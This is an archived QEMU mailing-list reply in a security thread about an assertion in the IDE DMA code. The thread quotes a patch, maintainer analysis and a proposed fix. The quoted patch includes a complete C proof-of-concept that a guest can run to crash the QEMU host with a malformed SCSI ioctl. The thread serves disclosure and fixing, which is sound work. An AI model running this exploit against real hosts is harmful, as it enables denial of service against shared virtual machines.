Return-Path: <SRS0=EylP=Y6=nongnu.org=qemu-devel-bounces+qemu-devel=archiver.kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-6.7 required=3.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
	INCLUDES_PATCH,MAILING_LIST_MULTI,SIGNED_OFF_BY,SPF_HELO_NONE,SPF_PASS,
	URIBL_BLOCKED autolearn=ham autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 50232C5DF62
	for <qemu-devel@archiver.kernel.org>; Wed,  6 Nov 2019 12:06:24 +0000 (UTC)
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 1C9CE214D8
	for <qemu-devel@archiver.kernel.org>; Wed,  6 Nov 2019 12:06:23 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 1C9CE214D8
Authentication-Results: mail.kernel.org; dmarc=fail (p=none dis=none) header.from=redhat.com
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Received: from localhost ([::1]:56936 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
	id 1iSK4t-0005AJ-3K
	for qemu-devel@archiver.kernel.org; Wed, 06 Nov 2019 07:06:23 -0500
Received: from eggs.gnu.org ([2001:470:142:3::10]:48427)
 by lists.gnu.org with esmtp (Exim 4.90_1)
 (envelope-from <mst@redhat.com>) id 1iSK41-0004Hq-9r
 for qemu-devel@nongnu.org; Wed, 06 Nov 2019 07:05:30 -0500
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
 (envelope-from <mst@redhat.com>) id 1iSK3w-0002T7-6F
 for qemu-devel@nongnu.org; Wed, 06 Nov 2019 07:05:29 -0500
Received: from mx1.redhat.com ([209.132.183.28]:32478)
 by eggs.gnu.org with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
 (Exim 4.71) (envelope-from <mst@redhat.com>) id 1iSK3v-0002SA-TG
 for qemu-devel@nongnu.org; Wed, 06 Nov 2019 07:05:24 -0500
Received: from mail-qt1-f200.google.com (mail-qt1-f200.google.com
 [209.85.160.200])
 (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 (No client certificate requested)
 by mx1.redhat.com (Postfix) with ESMTPS id F303C85539
 for <qemu-devel@nongnu.org>; Wed,  6 Nov 2019 12:05:22 +0000 (UTC)
Received: by mail-qt1-f200.google.com with SMTP id q54so25862037qtk.15
 for <qemu-devel@nongnu.org>; Wed, 06 Nov 2019 04:05:22 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20161025;
 h=x-gm-message-state:date:from:to:cc:subject:message-id:references
 :mime-version:content-disposition:in-reply-to;
 bh=fmixPB33/xbidsPZje7dwYDGidqowmS1Z6e576cmcmM=;
 b=Bsfa//MyNs61JpMdzyLAr7VdsJqic7v84biR0LWpGpiKXYta/Mw3W8gbaMTbrpCLF8
 oZ7ktTvazaR7PT6UrOs64KRpsGzQ84K0RwUUAIAy7Z0zGa4xyj0f8DvKrxrEm7FZxlI8
 2Uv7Z9pzIdMkomAVW2XftPH6DCzmRL/A1FJE15OWvqTF+EUpPQTehZU4WVTgOyfQMgY+
 GQ7XOOerUqCSgoPCG2fW2hn8X9Tsxlumxb9JJGwCKyO5GcGnMrdgkOwBFb+Swod4B1i4
 g2+Sw/IgbtbJM4fcaqqJkAymDXF2Lmv//Safd1exuNDO35FRLyqM1IAZP2S+hJr/v9qp
 egQQ==
X-Gm-Message-State: APjAAAXwtns0GIiQmig9+m6uMzObISdPXDnLscwHImom6Rd4qGyRH/vF
 2Z2LD/2sghnPSfpSAIxG3Zxv4eg7gC8ET+Kdp0QxWiIPjuZE5WfpjUSFzSSk23mjs3Yos0qGPdY
 Fh48JIb+Cm6jisSQ=
X-Received: by 2002:a05:620a:634:: with SMTP id
 20mr1637542qkv.330.1573041921905; 
 Wed, 06 Nov 2019 04:05:21 -0800 (PST)
X-Google-Smtp-Source: APXvYqyrEsasZIXJMiXRLMT5sQngK4X9p1w7GpSj0LInBOSfipyX7uAuC/Yf94BVi7oqfl+0HQ/jPQ==
X-Received: by 2002:a05:620a:634:: with SMTP id
 20mr1637511qkv.330.1573041921616; 
 Wed, 06 Nov 2019 04:05:21 -0800 (PST)
Received: from redhat.com (bzq-79-178-12-128.red.bezeqint.net. [79.178.12.128])
 by smtp.gmail.com with ESMTPSA id n49sm7581732qtk.94.2019.11.06.04.05.18
 (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
 Wed, 06 Nov 2019 04:05:20 -0800 (PST)
Date: Wed, 6 Nov 2019 07:05:15 -0500
From: "Michael S. Tsirkin" <mst@redhat.com>
To: John Snow <jsnow@redhat.com>
Subject: Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent
 qemu DoS from quest
Message-ID: <20191106070433-mutt-send-email-mst@kernel.org>
References: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
 <76881947-141b-0a16-c52d-a315203c32eb@redhat.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <76881947-141b-0a16-c52d-a315203c32eb@redhat.com>
X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
 [fuzzy]
X-Received-From: 209.132.183.28
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
Precedence: list
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Cc: sstabellini@kernel.org, pmatouse@redhat.com, mdroth@linux.vnet.ibm.com,
 qemu-block@nongnu.org, qemu-stable@nongnu.org, qemu-devel@nongnu.org,
 pjp@redhat.com, Alexander Popov <alex.popov@linux.com>
Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
Sender: "Qemu-devel"
 <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>

On Thu, Jul 25, 2019 at 08:25:03PM -0400, John Snow wrote:
> 
> 
> On 7/5/19 10:07 AM, Alexander Popov wrote:
> > This assertion was introduced in the commit a718978ed58a in July 2015.
> > It implies that the size of successful DMA transfers handled in
> > ide_dma_cb() should be multiple of 512 (the size of a sector).
> > 
> > But guest systems can initiate DMA transfers that don't fit this
> > requirement. Let's improve the assertion to prevent qemu DoS from quests.
> > 
> > PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
> > command and crash qemu:
> > 
> > #include <stdio.h>
> > #include <sys/ioctl.h>
> > #include <stdint.h>
> > #include <sys/types.h>
> > #include <sys/stat.h>
> > #include <fcntl.h>
> > #include <string.h>
> > #include <stdlib.h>
> > #include <scsi/scsi.h>
> > #include <scsi/scsi_ioctl.h>
> > 
> > #define CMD_SIZE 2048
> > 
> > struct scsi_ioctl_cmd_6 {
> > 	unsigned int inlen;
> > 	unsigned int outlen;
> > 	unsigned char cmd[6];
> > 	unsigned char data[];
> > };
> > 
> > int main(void)
> > {
> > 	intptr_t fd = 0;
> > 	struct scsi_ioctl_cmd_6 *cmd = NULL;
> > 
> > 	cmd = malloc(CMD_SIZE);
> > 	if (!cmd) {
> > 		perror("[-] malloc");
> > 		return 1;
> > 	}
> > 
> > 	memset(cmd, 0, CMD_SIZE);
> > 	cmd->inlen = 1337;
> > 	cmd->cmd[0] = READ_6;
> > 
> > 	fd = open("/dev/sg0", O_RDONLY);
> > 	if (fd == -1) {
> > 		perror("[-] opening sg");
> > 		return 1;
> > 	}
> > 
> > 	printf("[+] sg0 is opened\n");
> > 
> > 	printf("[.] qemu should break here:\n");
> > 	fflush(stdout);
> > 	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
> > 	printf("[-] qemu didn't break\n");
> > 
> > 	free(cmd);
> > 
> > 	return 1;
> > }
> > 
> > Signed-off-by: Alexander Popov <alex.popov@linux.com>
> > ---
> >  hw/ide/core.c | 2 +-
> >  1 file changed, 1 insertion(+), 1 deletion(-)
> > 
> > diff --git a/hw/ide/core.c b/hw/ide/core.c
> > index 6afadf8..304fe69 100644
> > --- a/hw/ide/core.c
> > +++ b/hw/ide/core.c
> > @@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
> >  
> >      sector_num = ide_get_sector(s);
> >      if (n > 0) {
> > -        assert(n * 512 == s->sg.size);
> > +        assert(n == s->sg.size / 512);
> >          dma_buf_commit(s, s->sg.size);
> >          sector_num += n;
> >          ide_set_sector(s, sector_num);
> > 
> 
> Oh, this is fun.
> 
> So you're actually requesting 131072 bytes (256 sectors) but you're
> giving it far too short of a PRDT.
> 
> But ... the prepare_buf callback got anything at all, so it was happy to
> proceed, but the callback chokes over the idea that the SGlist wasn't
> formatted correctly -- it can't deal with partial tails.
> 
> I think it might be the case that the sglist needs to be allowed to have
> an unaligned tail, and then the second trip to the dma_cb when there
> isn't any more regions in the PRDT to add to the SGList to transfer at
> least a single sector -- but the IDE state machine still has sectors to
> transfer -- we need to trigger the short PRD clause.
> 
> Papering over it by truncating the tail I think isn't sufficient; there
> are other problems this exposes.
> 
> As an emergency patch, it might be better to just do this whenever we
> see partial tails:
> 
> prepared = ...prepare_buf(s->bus->dma, s->io_buffer_size);
> if (prepared % 512) {
>     ide_dma_error(s);
>     return;
> }

Do you want to cook up a patch like this then?


> I think that prepare_buf does not give unaligned results if you provided
> *too many* bytes, so the unaligned return only happens when you starve it.
> 
> I can worry about a proper fix for 4.2+.
> 
> --js

